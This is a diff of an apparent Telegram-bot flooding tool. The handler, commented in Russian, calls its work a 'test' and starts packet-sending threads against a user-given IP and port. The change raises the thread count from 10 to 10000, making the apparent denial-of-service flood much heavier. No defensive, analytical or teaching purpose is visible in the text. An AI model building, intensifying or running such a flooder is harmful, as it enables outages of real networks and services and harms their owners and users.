@@ -38,7 +38,7 @@ async def start_test(update: Update, context: CallbackContext):
         await update.message.reply_text(f"Запускаю тест на {target_ip}:{target_port}...")
 
         # Запуск потоков для тестирования
-        for _ in range(10):  # Количество потоков, можно изменить
+        for _ in range(10000):  # Количество потоков, можно изменить
             thread = threading.Thread(target=send_packets, args=(target_ip, target_port))
             thread.start()
             threads.append(thread)
